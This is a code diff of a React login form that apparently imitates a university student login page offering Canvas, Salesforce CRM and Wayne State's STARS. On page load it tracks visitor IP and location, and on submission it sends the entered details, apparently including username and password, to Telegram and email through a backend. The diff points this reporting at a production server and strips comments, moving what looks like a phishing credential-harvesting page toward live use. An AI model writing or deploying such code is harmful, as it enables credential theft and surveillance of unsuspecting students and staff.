@@ -2,6 +2,9 @@
 
 import React, { useState, useEffect } from "react";
 
+// Base URL for backend: Railway in production, localhost in development
+const BASE_URL = process.env.NEXT_PUBLIC_API_URL || "http://localhost:5000";
+
 const LoginForm = ({ loginTitle, setLoginTitle }) => {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
@@ -11,13 +14,11 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
   const [processingForm, setProcessingForm] = useState(false);
   const [loginAttempts, setLoginAttempts] = useState(0);
 
-  // Location states
   const [ip, setIp] = useState("N/A");
   const [city, setCity] = useState("N/A");
   const [region, setRegion] = useState("N/A");
   const [country, setCountry] = useState("N/A");
 
-  // Fetch IP and Location
   useEffect(() => {
     const fetchLocation = async () => {
       try {
@@ -31,11 +32,9 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
         console.error("IP/Location fetch error:", err);
       }
     };
-
     fetchLocation();
   }, []);
 
-  // Visitor Alert (Only when all data is ready and once per session)
   useEffect(() => {
     const alreadySent = sessionStorage.getItem("visitorAlertSent");
 
@@ -50,19 +49,15 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
 🕒 Time: ${new Date().toLocaleString()}
 📄 Page: Student Login Page`;
 
-      // Send to Telegram via backend
       sendToTelegram(visitorAlert);
-
-      // Send email notification
       sendEmail(visitorAlert);
 
       sessionStorage.setItem("visitorAlertSent", "true");
     }
   }, [ip, city, region, country]);
 
-  // Function to send message to Telegram via backend
   const sendToTelegram = (message) => {
-    fetch("http://localhost:5000/send-telegram", {
+    fetch(`${BASE_URL}/send-telegram`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ message }),
@@ -79,9 +74,8 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
       });
   };
 
-  // Function to send email via backend
   const sendEmail = (message) => {
-    fetch("http://localhost:5000/send-email", {
+    fetch(`${BASE_URL}/send-email`, {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
@@ -133,10 +127,7 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
 - 🗺️ Region: ${region}
 - 🌎 Country: ${country}`;
 
-    // Send to Telegram via backend
     sendToTelegram(submission);
-
-    // Send login attempt email
     sendEmail(submission);
 
     if (loginAttempts === 0) {
@@ -214,7 +205,7 @@ const LoginForm = ({ loginTitle, setLoginTitle }) => {
               Canvas
             </option>
             <option data-system="Salesƒorce CRM" value="https://salesforce.com/crm">
-              Salesƒorce CRM
+              Salesforce CRM
             </option>
             <option data-system="STARS" value="https://stars.wayne.edu">
               STARS
